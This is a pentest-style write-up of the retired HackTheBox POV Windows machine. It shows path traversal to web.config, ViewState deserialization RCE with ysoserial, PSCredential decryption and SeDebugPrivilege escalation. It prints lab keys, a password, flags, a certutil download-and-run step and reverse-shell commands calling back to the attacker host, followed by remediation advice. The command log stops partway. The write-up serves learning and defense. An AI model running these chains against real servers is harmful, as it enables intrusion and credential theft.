# POV — HackTheBox Report

| Difficulty | OS      | Category       |
| ---------- | ------- | -------------- |
| Medium     | Windows | General Skills |

> Writeup of a retired POV machine, published for educational/portfolio purposes.

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Scope](#scope)
- [Approach / Methodology](#approach--methodology)
- [Tools Used](#tools-used)
- [Assessment Summary (Findings Overview)](#assessment-summary-findings-overview)
- [Attack Chain Walkthrough](#attack-chain-walkthrough)
  * [1.1. Port Scanning](#11-port-scanning)
  * [1.2. Virtual Host Enumeration](#12-virtual-host-enumeration)
  * [2.1. Path Traversal and web.config Extraction](#21-path-traversal-and-webconfig-extraction)
  * [2.2. MachineKey Extraction](#22-machinekey-extraction)
  * [2.3. ViewState Deserialization — Shell as sfitz](#23-viewstate-deserialization--shell-as-sfitz)
  * [3.1. PSCredential Decryption](#31-pscredential-decryption)
  * [3.2. Shell as alaading — User Flag](#32-shell-as-alaading--user-flag)
  * [4.1. SOCKS5 Tunnel via chisel](#41-socks5-tunnel-via-chisel)
  * [4.2. SeDebugPrivilege Abuse — SYSTEM and Root Flag](#42-sedebugprivilege-abuse--system-and-root-flag)
- [Technical Findings Details](#technical-findings-details)
- [Remediation Summary](#remediation-summary)
- [Lessons Learned / Skills Demonstrated](#lessons-learned--skills-demonstrated)
- [Appendix](#appendix)
  * [A. Finding Severity Definitions](#a-finding-severity-definitions)
  * [B. Exploited Hosts](#b-exploited-hosts)
  * [C. Compromised Users / Credentials](#c-compromised-users--credentials)
  * [D. Command Reference Log](#d-command-reference-log)
  * [E. References](#e-references)

---

## Executive Summary

**Target:** `POV / IP: 10.129.230.183`
**Platform:** `HackTheBox`
**Date Completed:** `October 14, 2026`
**Assessment Type:** `Web Application / Windows Host`
**Approach:** `Black box` — tested with `no prior knowledge`.

Pheenix Security was engaged to conduct a simulated attack against the HackTheBox POV environment. The test was carried out from the perspective of a complete outsider with no prior access, credentials, or knowledge of the environment.

The results are serious. Starting from a position of zero access, our team was able to gain full administrative control of the target Windows server. In a real-world scenario, this would allow an attacker to read and modify all data on the system, take over or create user accounts, and cause significant disruption — all remotely and without physical access to any device.

Four security issues were identified that made this possible. A file on the public-facing website could be read by anyone who knew how to ask for it, and that file contained secret keys used to secure the web application. Those keys allowed our team to force the web server to run arbitrary commands, handing over control of the server account. A second user's login credentials were found stored in a file on disk and were trivially recovered. That second account held a highly dangerous system permission that, when combined with a publicly available script, allowed our team to take over the operating system entirely.

The overall risk is rated **Critical**. The actions outlined in the Remediation Summary section of this report should be treated as an immediate priority.

---

## Scope

| Host / URL / IP Address        | Description                                              |
| ------------------------------ | -------------------------------------------------------- |
| `pov.htb / 10.129.230.183`     | Target machine — Windows Server (Microsoft IIS 10.0)     |
| `dev.pov.htb / 10.129.230.183` | Developer subdomain hosting the portfolio web application |

> Testing was restricted to the hosts listed above, consistent with the platform's rules of engagement.

---

## Approach / Methodology

1. **Reconnaissance** — active port and service discovery against the target.
2. **Scanning & Enumeration** — virtual host discovery and web application analysis.
3. **Vulnerability Analysis** — identifying path traversal, exposed secrets, and insecure credential storage.
4. **Exploitation** — ViewState deserialization for initial foothold; PSCredential decryption for lateral movement.
5. **Privilege Escalation** — abusing the `SeDebugPrivilege` token via process impersonation.
6. **Post-Exploitation** — validating full administrative access, capturing flags, and documenting impact.

---

## Tools Used

| Tool              | Purpose                                                                          |
| ----------------- | -------------------------------------------------------------------------------- |
| `nmap`            | Port scanning and service enumeration                                            |
| `ffuf`            | Virtual host (subdomain) fuzzing via Host header manipulation                    |
| Burp Suite        | Intercepting and modifying HTTP requests; file download parameter exploitation   |
| `ysoserial.exe`   | Generating malicious ASP.NET ViewState payloads for deserialization RCE          |
| `nc` (netcat)     | Listening for incoming reverse shells                                            |
| `tcpdump`         | Confirming out-of-band ICMP callbacks during ping-based RCE verification         |
| `RunasCs.exe`     | Executing commands as an alternate Windows user without an interactive login     |
| `chisel`          | Creating a reverse SOCKS5 tunnel to proxy traffic through the firewall           |
| `proxychains`     | Routing attacker traffic through the chisel SOCKS5 proxy                         |
| `evil-winrm`      | Authenticated WinRM shell for a stable interactive session                       |
| `psgetsys.ps1`    | PowerShell script exploiting SeDebugPrivilege via parent process impersonation   |
| `certutil`        | Transferring attacker-hosted files onto the target Windows host                  |

---

## Assessment Summary (Findings Overview)

Starting from a completely unauthenticated position, a path traversal vulnerability in a file download feature exposed the ASP.NET `web.config` file, including the application's `machineKey`. Using those keys, a cryptographically valid malicious ViewState payload was crafted to achieve unauthenticated remote code execution. A credential file found on the resulting shell was decrypted to obtain a second user's password. That user held `SeDebugPrivilege`, which was exploited to impersonate a SYSTEM process and achieve full host compromise. The overall risk is assessed as **Critical**.

| Severity      | Count |
| ------------- | ----- |
| Critical      | 1     |
| High          | 3     |
| Medium        | 0     |
| Low           | 0     |
| Informational | 0     |

| #  | Severity | Finding Name                                                     |
| -- | -------- | ---------------------------------------------------------------- |
| 1  | Critical | ASP.NET ViewState Deserialization via Exposed MachineKey         |
| 2  | High     | Local File Inclusion / Path Traversal in File Download Parameter |
| 3  | High     | Encrypted PSCredential Stored in User-Accessible Location        |
| 4  | High     | Privilege Escalation via SeDebugPrivilege Abuse                  |

*(Full detail on each finding is in the [Technical Findings Details](#technical-findings-details) section below.)*

---

## Attack Chain Walkthrough

> This section documents the full path from unauthenticated access to full host compromise, step by step, with commands and evidence. Lab IPs and credentials are shown as this is a retired HTB machine, published for educational and portfolio purposes.

### 1.1. Port Scanning

```
sudo nmap 10.129.230.183 -p- -sC -sV -Pn
```

![Nmap scan results showing only port 80 open, running Microsoft IIS 10.0, with the hostname pov.htb identified](./images/Pasted%20image%2020261003171722.png)

**Findings:** A single port was open: TCP 80 running Microsoft IIS 10.0. No other services were exposed externally. The hostname `pov.htb` was identified via HTTP response headers. Host entries were added for name resolution:

```
echo "10.129.230.183 pov.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://pov.htb` revealed a company website. The contact page disclosed the email address `sfitz@pov.htb`, confirming an internal username of `sfitz`.

![pov.htb main page showing the company website](./images/Pasted%20image%2020261003172023.png)

![Contact page revealing sfitz@pov.htb and referencing a dev subdomain](./images/Pasted%20image%2020261003172045.png)

---

### 1.2. Virtual Host Enumeration

```
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://pov.htb/ -H 'Host:FUZZ.pov.htb' -fs 12330
```

![ffuf output showing the dev subdomain discovered with a distinct response size](./images/Pasted%20image%2020261003173522.png)

**Findings:** The subdomain `dev.pov.htb` was discovered by filtering responses that differed in size from the default page. The host entry was added:

```
echo "10.129.230.183 dev.pov.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://dev.pov.htb/portfolio/` revealed a developer portfolio page attributed to Stephen Fitz, consistent with the `sfitz` username identified earlier.

![dev.pov.htb/portfolio/ showing Stephen Fitz's portfolio page with a CV download feature](./images/Pasted%20image%2020261003173608.png)

---

### 2.1. Path Traversal and web.config Extraction

The portfolio page included a CV download button. Intercepting the request in Burp Suite revealed a `file` parameter used to specify the file to serve. Manipulating this parameter with directory traversal sequences (`../`) allowed reading of arbitrary files on the server.

![Burp Suite showing the file download request with a user-controlled file parameter](./images/Pasted%20image%2020261003175418.png)

The traversal was directed at `web.config` — ASP.NET's primary application configuration file — located at the site root.

![Burp Suite response containing the full contents of web.config including the machineKey element](./images/Pasted%20image%2020261003180109.png)

**Findings:** The server returned the full `web.config` file. The `<machineKey>` element was present, disclosing the AES decryption key and SHA1 validation key used to sign and encrypt ASP.NET ViewState.

---

### 2.2. MachineKey Extraction

The following `machineKey` values were extracted from the `web.config` response:

```
<machineKey decryption="AES"
  decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
  validation="SHA1"
  validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
```

**Findings:** With both keys in hand, it is possible to use `ysoserial.exe` to forge a cryptographically valid ASP.NET ViewState payload containing an arbitrary .NET deserialization gadget chain, leading to remote code execution on the server.

---

### 2.3. ViewState Deserialization — Shell as sfitz

`ysoserial.exe` was used to generate a malicious ViewState payload embedding a ping command, to confirm out-of-band code execution before attempting a reverse shell:

```
PS C:\Users\nos\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "ping 10.10.14.188"
```

`tcpdump` on the attacker machine confirmed ICMP packets arriving from `10.129.230.183`, verifying remote code execution:

![tcpdump output showing ICMP echo requests arriving from 10.129.230.183, confirming the ping payload executed on the target](./images/Pasted%20image%2020261014185651.png)

A reverse shell payload was then embedded in a second `ysoserial.exe` invocation and submitted via Burp Suite:

![Burp Suite repeater showing the POST request containing the malicious ViewState reverse shell payload](./images/Pasted%20image%2020261014185717.png)

A `netcat` listener received the connection:

```
┌─[us-dedivip-5]─[10.10.14.188]─[pheenixx@htb-mps9ee9vhm]─[~/viewgen]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.230.183 49671
whoami
pov\sfitz
PS C:\windows\system32\inetsrv>
```

**Result:** A reverse shell was obtained as `pov\sfitz` — the IIS application pool identity.

---

### 3.1. PSCredential Decryption

Enumerating the `sfitz` home directory revealed a file named `connection.xml` in the `Documents` folder:

```
PS C:\users\sfitz> tree . /F
C:\USERS\SFITZ
    Documents
        connection.xml
```

The file contained a serialized PowerShell `PSCredential` object with an encrypted password for the `alaading` user:

```
PS C:\users\sfitz> type c:\users\sfitz\Documents\connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb...</SS>
    </Props>
  </Obj>
</Objs>
```

Because `PSCredential` XML files are encrypted with the Windows DPAPI tied to the creating user's account, any process running as `sfitz` can decrypt it using `Import-Clixml`:

```
PS C:\users\sfitz> $encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
PS C:\users\sfitz> $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
PS C:\users\sfitz> $decryptedPassword
f8gQ8fynP44ek1m3
```

**Credential recovered:** `alaading` : `f8gQ8fynP44ek1m3`

---

### 3.2. Shell as alaading — User Flag

`RunasCs.exe` was transferred to the target via `certutil` and used to execute a reverse shell as `alaading`:

```
PS C:\users\sfitz> certutil -urlcache -f http://10.10.14.188:9000/RunasCs.exe RunasCs.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

PS C:\users\sfitz> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.188:5555

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1344 created in background.
```

A second `netcat` listener received the shell:

```
Connection received on 10.129.230.183 49676
Microsoft Windows [Version 10.0.17763.5329]

PS C:\Windows\system32> whoami
pov\alaading
PS C:\Windows\system32> type c:\users\alaading\desktop\user.txt
eb96823fcb8e84c11241ce72d8b22173
```

**user.txt:** `eb96823fcb8e84c11241ce72d8b22173`

---

### 4.1. SOCKS5 Tunnel via chisel

Enumerating `alaading`'s privileges revealed `SeDebugPrivilege` was enabled:

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To obtain a stable WinRM session for exploitation, `chisel` was transferred to the target and used to establish a reverse SOCKS5 tunnel:

```
# Attacker — start chisel server
./chisel_1.12.0_linux_amd64 server --reverse -p 8000
2026/10/14 19:51:06 server: Reverse tunnelling enabled
2026/10/14 19:51:06 server: Listening on http://0.0.0.0:8000
2026/10/14 19:51:54 server: session#1: Open (addr=10.129.230.183:49686 remotes=R:127.0.0.1:1080:socks)

# Target — connect as client
c:\ProgramData>.\chisel.exe client 10.10.14.188:8000 R:socks
2026/10/14 16:51:54 client: Connected (Latency 7.7811ms)
```

With `proxychains` configured for `127.0.0.1:1080`, `evil-winrm` provided a stable interactive session as `alaading`:

```
proxychains -q evil-winrm -i pov.htb -u alaading -p f8gQ8fynP44ek1m3

*Evil-WinRM* PS C:\Users\alaading\Documents>
```

---

### 4.2. SeDebugPrivilege Abuse — SYSTEM and Root Flag

The process list confirmed `winlogon.exe` running as SYSTEM at PID 552 — a suitable impersonation target:

```
Handles  NPM(K)  PM(K)  WS(K)  CPU(s)  Id  SI  ProcessName
    255     12   2672  16480    0.41  552   1  winlogon
```

`psgetsys.ps1` was transferred to `C:\ProgramData`. `ImpersonateFromParentPid` was called, targeting `winlogon.exe` (PID 552) and injecting a base64-encoded PowerShell reverse shell:

```
*Evil-WinRM* PS C:\programdata> ipmo .\psgetsys.ps1
*Evil-WinRM* PS C:\programdata> ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0A..."
```

A reverse shell was received running as `NT AUTHORITY\SYSTEM`. The root flag was retrieved from the Administrator desktop:

```
PS C:\users\administrator\desktop> cat root.txt
cf522f679b31ad8169e4a185acb5cc28
```

**Result:** Full SYSTEM-level compromise achieved.

**root.txt:** `cf522f679b31ad8169e4a185acb5cc28`

---

## Technical Findings Details

### 1. ASP.NET ViewState Deserialization via Exposed MachineKey — Critical

| Field                              | Details                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE**                            | CWE-502: Deserialization of Untrusted Data                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **CVSS 3.1 Score**                 | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **Description (Incl. Root Cause)** | The ASP.NET `web.config` was readable via path traversal (Finding #2). The file contained the `machineKey` — the AES decryption key and SHA1 validation key used to sign and verify ViewState tokens. With these keys, an attacker can use `ysoserial.exe` to forge a cryptographically valid ViewState payload embedding a .NET deserialization gadget chain. When this payload is submitted to the application, the server deserializes it and executes the attacker-supplied command. The root cause is the combination of an exposed configuration file and the inherently dangerous nature of a disclosed `machineKey`. |
| **Security Impact**                | Unauthenticated remote code execution as the IIS application pool identity (`pov\sfitz`). The attacker gains an interactive shell on the web server with no credentials required. This is the most critical finding in the assessment and is directly enabled by Finding #2.                                                                                                                                                                                                                    |
| **Affected Host(s)**               | `10.129.230.183:80` — `dev.pov.htb/portfolio/`                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| **Remediation**                    | - Rotate the `machineKey` immediately — the current keys are compromised and must be replaced — Store the `machineKey` outside `web.config` using environment variables or a secrets management solution — Remediate the path traversal vulnerability (Finding #2) to prevent future configuration file disclosure — Enable `viewStateEncryptionMode="Always"` and consider upgrading to ASP.NET Core, which does not use ViewState |
| **References**                     | [MITRE ATT&CK: T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/) · [NotSoSecure — Exploiting ViewState Deserialization](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net) · [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)                                                                                                               |

**Evidence:**

```
# Malicious ViewState payload generated with extracted machineKey:
.\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" \
  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" \
  --validationalg="SHA1" \
  --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" \
  --path="/portfolio" -c "ping 10.10.14.188"

# Reverse shell received:
Connection received on 10.129.230.183 49671
whoami
pov\sfitz
```

`Screenshot Pasted image 20261014185651.png: tcpdump confirming ICMP callback from 10.129.230.183 proving RCE via the ViewState payload`

`Screenshot Pasted image 20261014185717.png: Burp Suite showing the POST request containing the malicious ViewState reverse shell payload`

---

### 2. Local File Inclusion / Path Traversal in File Download Parameter — High

| Field                              | Details                                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE**                            | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')                                                                                                                                                                                                                                                                              |
| **CVSS 3.1 Score**                 | 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`                                                                                                                                                                                                                                                                                                        |
| **Description (Incl. Root Cause)** | The CV download feature on `dev.pov.htb/portfolio/` accepted a user-supplied `file` parameter and passed it to a server-side file read routine without sanitizing directory traversal sequences (`../`). By supplying a crafted path, an attacker could read any file accessible by the IIS worker process, including the application's `web.config` configuration file. The root cause is the absence of input validation and path canonicalization on a file-serving endpoint. |
| **Security Impact**                | Disclosure of `web.config` and its `machineKey`, which is the direct prerequisite for the Critical RCE finding (Finding #1). Any other file readable by the IIS worker process — including application source code, database connection strings, or other secrets — could also be exfiltrated.                                                                       |
| **Affected Host(s)**               | `10.129.230.183:80` — `dev.pov.htb/portfolio/` (`file` parameter)                                                                                                                                                                                                                                                                                                   |
| **Remediation**                    | - Validate and canonicalize the `file` parameter against a strict whitelist of permitted files or a safe base directory, rejecting any path containing `..` or absolute path indicators — Use indirect file references (e.g., a numeric ID mapped server-side to a file path) instead of exposing raw filesystem paths in request parameters — Ensure the IIS worker process account is granted only the minimum file system permissions required to serve application content |
| **References**                     | [MITRE ATT&CK: T1083 — File and Directory Discovery](https://attack.mitre.org/techniques/T1083/) · [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) · [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)                                                                                                      |

**Evidence:**

```
# File parameter manipulated to read web.config via path traversal
# Submitted via Burp Suite repeater; server returned full web.config contents
```

`Screenshot Pasted image 20261003175418.png: Burp Suite showing the file download request with a path traversal sequence in the file parameter`

`Screenshot Pasted image 20261003180109.png: Burp Suite response containing the full web.config file including the machineKey element`

---

### 3. Encrypted PSCredential Stored in User-Accessible Location — High

| Field                              | Details                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE**                            | CWE-312: Cleartext Storage of Sensitive Information                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **CVSS 3.1 Score**                 | 7.8 (High) — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Description (Incl. Root Cause)** | A PowerShell credential export file (`connection.xml`) was stored in `sfitz`'s `Documents` folder. The file was created with `Export-Clixml`, which encrypts the password using the Windows DPAPI scoped to the creating user's account. Because any process running as `sfitz` shares that DPAPI context, the password for `alaading` could be decrypted with two lines of PowerShell using `Import-Clixml` and `GetNetworkCredential()`. The root cause is storing credentials on disk in a location accessible to the compromised service account, regardless of the encryption method used. |
| **Security Impact**                | Credential compromise of `alaading`, enabling lateral movement and the privilege escalation chain that resulted in full SYSTEM access.                                                                                                                                                                                                                                                                                                                                        |
| **Affected Host(s)**               | `10.129.230.183` — `C:\Users\sfitz\Documents\connection.xml`                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Remediation**                    | - Remove `connection.xml` from disk immediately and rotate the `alaading` password — Do not store credentials in files on disk, even in encrypted form; use a dedicated secrets management solution such as Windows Credential Manager, a Group Managed Service Account (gMSA), or an external vault — Audit file system permissions to ensure credential files are not readable by unintended accounts or service identities |
| **References**                     | [MITRE ATT&CK: T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) · [Microsoft — Export-Clixml](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) · [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)                                                                                                               |

**Evidence:**

```powershell
# PSCredential decrypted within the sfitz session:
$encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
$decryptedPassword
# f8gQ8fynP44ek1m3
```

---

### 4. Privilege Escalation via SeDebugPrivilege Abuse — High

| Field                              | Details                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE**                            | CWE-269: Improper Privilege Management                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **CVSS 3.1 Score**                 | 7.8 (High) — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **Description (Incl. Root Cause)** | The `alaading` user account held the `SeDebugPrivilege` Windows token privilege in an enabled state. This privilege allows a process to open handles to any other process on the system — including those running as `SYSTEM` — with full access rights. Using `psgetsys.ps1`, the `ImpersonateFromParentPid` function was called with the PID of `winlogon.exe` (552, running as SYSTEM), which injected a reverse shell payload that executed under the SYSTEM security context. The root cause is an overpermissive privilege assignment on a non-administrative user account. |
| **Security Impact**                | Full SYSTEM-level compromise of the target host. The attacker gained unrestricted access to all processes, files, registry hives, and credentials on the machine.                                                                                                                                                                                                                                                                                                                               |
| **Affected Host(s)**               | `10.129.230.183` — User: `pov\alaading`                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Remediation**                    | - Remove `SeDebugPrivilege` from `alaading` and all other non-administrative accounts immediately — Audit all local and domain accounts holding this privilege; it should be restricted to members of the local Administrators group only — Apply the principle of least privilege: service accounts and standard user accounts should never hold token privileges that grant effective SYSTEM access |
| **References**                     | [MITRE ATT&CK: T1134.002 — Access Token Manipulation: Create Process with Token](https://attack.mitre.org/techniques/T1134/002/) · [Microsoft Devblog — SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) · [HackTricks — SeDebugPrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#sedebugprivilege) · [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html) |

**Evidence:**

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```
# Impersonating winlogon.exe (PID 552, SYSTEM) via psgetsys.ps1:
*Evil-WinRM* PS C:\programdata> ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e <base64_payload>"

# Root flag captured:
PS C:\users\administrator\desktop> cat root.txt
cf522f679b31ad8169e4a185acb5cc28
```

---

## Remediation Summary

### Short Term

- **Finding #1 (ViewState Deserialization)** — Rotate the `machineKey` immediately; the disclosed AES and SHA1 keys are compromised and must be replaced before any other remediation is effective.
- **Finding #2 (Path Traversal)** — Sanitize the `file` parameter to reject directory traversal sequences and restrict file reads to an approved base directory.
- **Finding #3 (PSCredential on Disk)** — Delete `connection.xml` from `sfitz`'s Documents folder and rotate the `alaading` account password.
- **Finding #4 (SeDebugPrivilege)** — Remove `SeDebugPrivilege` from `alaading` via Local Security Policy or Group Policy immediately.

### Medium Term

- **Finding #1 (ViewState Deserialization)** — Move the `machineKey` out of `web.config` into environment variables or a secrets vault. Evaluate upgrading to ASP.NET Core to eliminate the ViewState attack surface entirely.
- **Finding #2 (Path Traversal)** — Replace the raw `file` parameter with an indirect reference scheme (e.g., a numeric ID mapped server-side) and apply a whitelist of permitted downloadable files at the application level.
- **Finding #3 (PSCredential on Disk)** — Implement a secrets management solution to eliminate credential files on disk across the environment.
- **Finding #4 (SeDebugPrivilege)** — Audit all accounts holding `SeDebugPrivilege` across the environment. Document which accounts require it, restrict it to Tier-0 administrators only, and enforce this via Group Policy.

### Long Term

- Adopt the principle of least privilege organization-wide: service accounts and web application identities should hold only the rights required to perform their specific function.
- Implement a Web Application Firewall (WAF) with rules detecting path traversal patterns in HTTP request parameters.
- Establish a recurring review cycle for local privilege assignments and sensitive files stored in user home directories to detect configuration drift before it can be exploited.
- Conduct periodic penetration tests to validate that remediation is effective and to identify new issues before they are exploited.

---

## Lessons Learned / Skills Demonstrated

**Skill/Technique 1: Virtual Host Enumeration via ffuf.** Identified a non-obvious developer subdomain (`dev.pov.htb`) by fuzzing the `Host` header and filtering responses by size. This expanded the attack surface significantly, as the main domain offered no exploitable functionality.

**Skill/Technique 2: Path Traversal / Local File Inclusion to Extract Sensitive Configuration.** Exploited an unsanitized `file` parameter in a file download endpoint to read `web.config` from the server. Recognized the significance of the `machineKey` element within the file as the key to forging malicious ViewState tokens.

**Skill/Technique 3: ASP.NET ViewState Deserialization for Unauthenticated RCE.** Used `ysoserial.exe` with a `WindowsIdentity` gadget chain and the extracted `machineKey` values to forge a cryptographically valid ViewState payload achieving remote code execution. Validated execution out-of-band with a ping test and `tcpdump` before deploying a full reverse shell.

**Skill/Technique 4: PSCredential Decryption via DPAPI Context.** Recognized that a `PSCredential` XML file encrypted with `Export-Clixml` is decryptable within the session of the user who created it. Used `Import-Clixml` and `GetNetworkCredential()` to recover a plaintext password in two lines of PowerShell without any cracking tools.

**Skill/Technique 5: Privilege Escalation via SeDebugPrivilege and Process Impersonation.** Identified `SeDebugPrivilege` as the escalation vector from `whoami /priv`, established a stable WinRM session via a chisel SOCKS5 tunnel, and used `psgetsys.ps1` to impersonate `winlogon.exe` (SYSTEM) via `ImpersonateFromParentPid`, achieving full host compromise.

---

## Appendix

### A. Finding Severity Definitions

| Rating       | Definition                                                                                     |
| ------------ | ---------------------------------------------------------------------------------------------- |
| **Critical** | Exploitation leads to full system/domain compromise with little to no effort or prerequisites. |
| **High**     | Exploitation causes substantial harm to confidentiality, integrity, or availability.           |
| **Medium**   | Exploitation has a moderate impact, or a high-impact issue with limited exposure.              |
| **Low**      | Exploitation causes minimal impact to operations.                                              |
| **Info**     | An observation or improvement opportunity; not itself a vulnerability.                         |

### B. Exploited Hosts

| Host                   | Method                                                          | Notes                                                       |
| ---------------------- | --------------------------------------------------------------- | ----------------------------------------------------------- |
| `10.129.230.183:80`    | Path traversal reading `web.config`                             | MachineKey disclosed; prerequisite for ViewState RCE        |
| `10.129.230.183:80`    | ViewState deserialization via ysoserial.exe                     | Interactive shell as `pov\sfitz` — initial foothold         |
| `10.129.230.183`       | RunasCs.exe with decrypted alaading credentials                 | Interactive shell as `pov\alaading` — user.txt captured     |
| `10.129.230.183`       | SeDebugPrivilege abuse via psgetsys.ps1 (winlogon PID 552)      | Full SYSTEM shell — root.txt captured                       |

### C. Compromised Users / Credentials

| Username     | Method                                                         | Notes                                          |
| ------------ | -------------------------------------------------------------- | ---------------------------------------------- |
| `pov\sfitz`  | ViewState deserialization RCE (no credentials required)        | IIS app pool identity; initial foothold         |
| `alaading`   | PSCredential decrypted via Import-Clixml (`f8gQ8fynP44ek1m3`) | SeDebugPrivilege holder; pivot to SYSTEM        |
| `SYSTEM`     | SeDebugPrivilege abuse — winlogon.exe impersonation            | Full host compromise; root.txt captured         |

### D. Command Reference Log

```bash
# ──────────────────────────────────────────────
# PHASE 1: RECONNAISSANCE & ENUMERATION
# ──────────────────────────────────────────────
sudo nmap 10.129.230.183 -p- -sC -sV -Pn
echo "10.129.230.183 pov.htb" | sudo tee -a /etc/hosts

ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://pov.htb/ -H 'Host:FUZZ.pov.htb' -fs 12330
echo "10.129.230.183 dev.pov.htb" | sudo tee -a /etc/hosts

# ──────────────────────────────────────────────
# PHASE 2: INITIAL ACCESS
# ──────────────────────────────────────────────
# Path traversal in Burp Suite — file parameter manipulated to read web.config
# machineKey extracted from response

# ViewState ping test (RCE confirmation):
.\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "ping 10.10.14.188"

# ViewState reverse shell payload sent via Burp Suite repeater
nc -lvnp 4444
# Shell received as pov\sfitz

# ──────────────────────────────────────────────
# PHASE 3: LATERAL MOVEMENT
# ──────────────────────────────────────────────
